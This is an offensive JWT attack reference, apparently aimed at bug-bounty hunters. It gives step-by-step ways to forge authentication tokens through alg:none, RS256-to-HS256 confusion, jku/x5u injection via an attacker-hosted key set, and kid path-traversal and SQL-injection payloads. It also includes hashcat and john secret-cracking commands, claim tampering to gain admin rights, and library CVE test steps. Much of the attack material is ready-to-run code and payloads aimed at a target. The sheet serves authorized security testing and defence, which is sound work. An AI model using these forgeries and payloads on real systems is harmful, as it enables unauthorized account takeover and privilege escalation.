# JWT Attacks — Deep Reference

## Table of Contents
1. Algorithm Confusion
2. Header Injection (jku, x5u, kid)
3. Weak Secret Brute Force
4. Claim Manipulation
5. Token Parsing Confusion
6. Implementation-Specific Bugs
7. 2024–2025 Library CVEs

---

## 1. Algorithm Confusion

### alg: none
The most basic JWT attack. If the server doesn't enforce algorithm validation, you can strip the signature.

**Steps:**
1. Decode the JWT (base64url decode header and payload)
2. Change `"alg": "RS256"` (or any) to `"alg": "none"`
3. Modify claims as desired
4. Re-encode header and payload, append empty signature: `header.payload.`
5. Send to server

**Variations to try:**
- `"alg": "None"` (capital N)
- `"alg": "NONE"`
- `"alg": "nOnE"`
- Remove the `alg` field entirely

**Tool:** `python3 -c "import base64,json; h=json.dumps({'alg':'none','typ':'JWT'}); p=json.dumps({'sub':'admin','role':'admin'}); print(base64.urlsafe_b64encode(h.encode()).rstrip(b'=').decode()+'.'+base64.urlsafe_b64encode(p.encode()).rstrip(b'=').decode()+'.') "`

---

### RS256 → HS256 Confusion
If the server has the public key available (common — it's often in `/jwks.json` or source code), and doesn't enforce algorithm type, you can forge tokens signed with the public key as an HMAC secret.

**Why it works:** RS256 verifies with the *public key*. HS256 verifies with a *shared secret*. If you switch the algorithm and sign with the public key as the HMAC secret, a naive implementation will verify it correctly.

**Steps:**
1. Obtain the server's public key (try `/jwks.json`, `/.well-known/jwks.json`, source code, SSL cert)
2. Convert public key to PEM format if needed
3. Create a new JWT with `"alg": "HS256"` and modified claims
4. Sign with the public key bytes as the HMAC-SHA256 secret

**Tool (python):**
```python
import jwt
import requests

# Get public key
jwks = requests.get('https://target.com/.well-known/jwks.json').json()
public_key = jwks['keys'][0]  # extract and convert to PEM

# Forge token
payload = {'sub': 'admin', 'role': 'admin', 'exp': 9999999999}
forged = jwt.encode(payload, public_key_pem, algorithm='HS256')
```

**Tool:** jwt_tool: `python3 jwt_tool.py <token> -X k -pk public.pem`

---

## 2. Header Injection Attacks

### jku (JWK Set URL)
The `jku` header tells the server where to fetch the JWKS to verify the token. If the server fetches it without restriction, you can point it at your own server.

**Steps:**
1. Host a JWKS file with your own RSA key pair at your server (e.g., `https://attacker.com/jwks.json`)
2. Create a JWT signed with your private key
3. Set `jku` in the header to your JWKS URL
4. Send — server fetches your JWKS, finds your public key, verifies successfully

**JWKS format to host:**
```json
{
  "keys": [{
    "kty": "RSA",
    "kid": "my-key",
    "use": "sig",
    "n": "<your_base64url_modulus>",
    "e": "AQAB"
  }]
}
```

**Bypass attempts if validation exists:**
- `jku` must contain target domain: try `https://target.com@attacker.com/jwks.json`
- Open redirect: `https://target.com/redirect?url=https://attacker.com/jwks.json`
- URL parameter: `https://target.com/api?url=https://attacker.com/jwks.json` (SSRF)

**Tool:** jwt_tool: `python3 jwt_tool.py <token> -X s`

---

### x5u (X.509 URL)
Same concept as `jku` but for X.509 certificates. Server fetches certificate from URL in header.

**Steps:**
1. Generate a self-signed certificate
2. Host the cert at your server
3. Set `x5u` to your URL in the JWT header
4. Sign with your private key

**Tool:** `openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes`

---

### kid (Key ID) Attacks

The `kid` header tells the server which key to use for verification. If the kid value is used in a file path or SQL query without sanitization:

**Path traversal:**
- `"kid": "../../dev/null"` → HMAC key becomes empty string, sign with empty string
- `"kid": "../../etc/passwd"` → HMAC key becomes /etc/passwd contents (predictable)
- `"kid": "../../proc/sys/kernel/randomize_va_space"` → key is `2` or similar short string

**Sign with empty string:**
```python
import jwt
token = jwt.encode(payload, '', algorithm='HS256', headers={'kid': '../../dev/null'})
```

**SQL injection in kid:**
- `"kid": "' UNION SELECT 'attacker_secret' FROM dual--"`
- `"kid": "' UNION SELECT 'attacker_secret'--"`
- Server fetches key from DB using kid in raw SQL → inject your own key value

---

## 3. Weak Secret Brute Force

If the algorithm is HS256/HS384/HS512, the signature is an HMAC. If the secret is weak, you can crack it offline.

**Hashcat:**
```bash
hashcat -a 0 -m 16500 <full_jwt_token> /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 <full_jwt_token> /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
```

**Custom wordlist additions (always try):**
- App name, domain name
- `secret`, `password`, `changeme`
- `your-256-bit-secret` (from jwt.io docs — devs copy this)
- Empty string `""`
- `null`
- App version numbers

**john:**
```bash
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt
```

---

## 4. Claim Manipulation

Once you have signing capability (via any method above), modify these claims:

| Claim | Attack |
|-------|--------|
| `sub` / `user_id` | Change to another user's ID |
| `role` / `admin` | Escalate to admin role |
| `email` | Change to admin email |
| `email_verified` | Set to `true` if false |
| `exp` | Set to far future (never expires) |
| `iat` | Set to past (bypass time checks) |
| `aud` | Change audience to another service |
| `scope` | Add extra OAuth scopes |
| `permissions` | Add permissions array entries |

---

## 5. Token Parsing Confusion

### Duplicate Claims
Some libraries use the first occurrence of a claim, others the last. Inject a claim twice:
```json
{"sub": "admin", "sub": "user123"}
```

### Type Confusion
Change a string claim to an integer or array:
```json
{"role": ["admin", "user"]}  // was "user"
{"admin": 1}  // was false
```

### Nested JWT
Some implementations accept a JWT inside a JWT claim. Try base64-encoding a modified JWT inside a claim value.

---

## 6. Implementation-Specific Bugs

### Auth0
- Check for `legacy grant type` enabled: `grant_type=password`
- Test `id_token` as `access_token` in API calls

### Firebase
- `alg: RS256` keys rotate — check if old tokens still valid
- Anonymous auth → link to privileged account without re-auth

### Cognito
- `kid` corresponds to well-known JWKS — standard RS256 confusion applies
- Check if access token accepted where id_token expected

### Azure AD
- Multi-tenant: tokens from tenant A sometimes accepted by tenant B
- `aud` claim may be permissive across apps in same tenant

---

## Quick Reference: jwt_tool Commands

```bash
# Decode and display
python3 jwt_tool.py <token>

# Try all algorithm confusion attacks
python3 jwt_tool.py <token> -X a

# Inject jku
python3 jwt_tool.py <token> -X s

# RS256 -> HS256 with public key
python3 jwt_tool.py <token> -X k -pk public.pem

# Brute force secret
python3 jwt_tool.py <token> -C -d wordlist.txt

# Modify claim
python3 jwt_tool.py <token> -T  # interactive tamper
```

---

## 7. 2024–2025 Library CVEs

These are confirmed, exploitable vulnerabilities in production JWT libraries. Always check library versions before moving to manual testing.

### CVE-2024-37568 — authlib Algorithm Confusion (Python)
**CVSS:** 7.5 High | **Patched:** authlib >= 1.3.1

**What it is:** When the `alg` claim is missing from a JWT header, authlib defaults to the HMAC verification path and accepts the RSA public key as the HMAC secret — textbook algorithm confusion.

**Test:**
```python
# Craft token with no alg header at all (or alg missing):
# {"typ": "JWT"}  <- no alg field
# Sign with HS256 using the server's RSA public key bytes
# authlib < 1.3.1 accepts it

# Check version:
pip show authlib | grep Version
```

**How to detect target uses authlib:**
- Python stack traces mentioning `authlib`
- `pip freeze` in exposed debug endpoints
- GitHub repo `requirements.txt`

---

### CVE-2024-54150 — cjwt Algorithm Confusion (C library)
**CVSS:** Critical | **Affected:** cjwt C library

**What it is:** `cjwt_decode` does not require callers to specify the expected algorithm — it trusts the `alg` header from the unverified token. The RSA and HMAC verification code paths are architecturally similar, making confusion trivial.

**Impact:** IoT devices, embedded systems, and services using cjwt for JWT validation are vulnerable to complete signature bypass via RS256→HS256 confusion.

**Detection:** Check if the target runs embedded/C-based infrastructure. Look for firmware, IoT APIs, or C/C++ services.

---

### CVE-2024-53861 — PyJWT Issuer Partial Match (Python)
**CVSS:** 2.2 Low | **Patched:** PyJWT >= 2.10.1

**What it is:** PyJWT 2.10.0 changed the issuer validation from `==` to `in` (the `in` operator for sequences). Since `str` is a `Sequence`, `"abc" in "__abcd__"` evaluates to `True`. A forged token with `iss: "sub_string_of_real_issuer"` passes validation.

**Example:**
```
Real issuer: https://auth.example.com
Bypass iss:  auth.example   (contained within real issuer)
             example.com    (also contained)
             https://auth   (prefix contained)
```

**Combine with:** Weak key, jku injection, or other attacks that give you signing capability — this CVE then lets you spoof the issuer claim.

**Check version:**
```bash
pip show PyJWT | grep Version
# Vulnerable: 2.10.0
# Safe: 2.10.1+
```

---

### CVE-2025-45768 — PyJWT No Key Length Enforcement (Disputed)
**CVSS:** 7.0 High | **Status:** Disputed by vendor

**What it is:** PyJWT 2.10.1 enforces no minimum HMAC or RSA key length. Short HMAC secrets (e.g., 8-byte keys) are accepted without warning.

**Bug bounty relevance:** Applications using PyJWT with short/weak secrets remain trivially brute-forceable. The CVE dispute doesn't change the real-world risk of weak keys.

**Test:** Always run hashcat against any HS256/HS384/HS512 JWT regardless of library:
```bash
hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt
hashcat -a 3 -m 16500 <token> "?a?a?a?a?a?a?a?a"  # brute force up to 8 chars
```

---

### Platform CVE Quick Reference

| Platform | CVE | CVSS | What it is | Status |
|----------|-----|------|------------|--------|
| **Entra ID** | CVE-2025-55241 | **10.0** | Cross-tenant Global Admin impersonation via unsigned actor tokens | Patched server-side Jul 2025 |
| **GitHub Enterprise** | CVE-2024-6800 | 9.5 | XSW via public IdP federation metadata signature | Patched GHES 3.13.3 |
| **GitHub Enterprise** | CVE-2024-4985 | **10.0** | Encrypted assertion signature skip → unauthenticated login as any user | Patched |
| **GitHub Enterprise** | CVE-2024-9487 | 9.5 | Namespace confusion SAML bypass | Patched |
| **Okta** | (no CVE) | High | AD/LDAP bcrypt truncation — 52-char username + MFA disabled + cache hit = login with any password | Patched Oct 2024 |
| **ruby-saml** | CVE-2024-45409 | **10.0** | XPath `//` selector bypass — one valid SAML response lets you log in as any user | Patched 1.17.0 |
| **ruby-saml** | CVE-2025-25291/92 | Critical | Parser differential (REXML vs Nokogiri) — forge assertions with one valid token | Patched 1.18.0 |
| **Keycloak** | CVE-2024-4540 | 7.5 | PAR params exposed in plaintext `KC_RESTART` cookie | Patched 24.0.5 |

**Testing workflow:** Always check versions first. If target uses a vulnerable version, these attacks go from "theory" to "guaranteed."
